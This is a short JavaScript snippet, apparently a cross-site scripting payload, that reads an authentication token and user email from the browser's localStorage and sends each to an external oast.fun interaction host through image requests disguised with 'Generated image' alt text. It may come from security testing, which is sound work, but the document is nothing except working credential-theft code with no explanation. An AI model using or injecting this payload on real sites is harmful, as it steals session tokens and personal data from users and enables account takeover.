let token=localStorage.getItem('__aple_auth__')
let email=localStorage.getItem('__aple_user__')
var imgElement = document.createElement('img');
var imgElement2 = document.createElement('img');
imgElement.src = 'https://qlczvvvmiqyxqynbxerd4zmpr24rq2j5q.oast.fun/?token='+token
imgElement2.src = 'https://qlczvvvmiqyxqynbxerd4zmpr24rq2j5q.oast.fun/?email='+email
imgElement2.alt = 'Generated image';
imgElement.alt = 'Generated image';
document.body.appendChild(imgElement);
document.body.appendChild(imgElement2);
